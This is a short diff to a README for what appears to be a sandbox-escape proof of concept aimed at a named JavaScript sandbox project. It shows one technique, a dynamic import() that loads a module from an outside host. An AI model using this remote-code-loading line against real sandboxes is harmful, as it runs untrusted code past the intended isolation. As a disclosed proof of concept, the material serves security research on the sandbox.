@@ -1,5 +1,7 @@
 # Sandbox Escape PoC
 
+Exploits for https://github.com/wesz/javascript-sandbox
+
 ## Dynamic module import
 ```javascript
 const modulePromise = import ("https://lgfrbcsgo.github.io/sandbox-escape-poc/module.js")
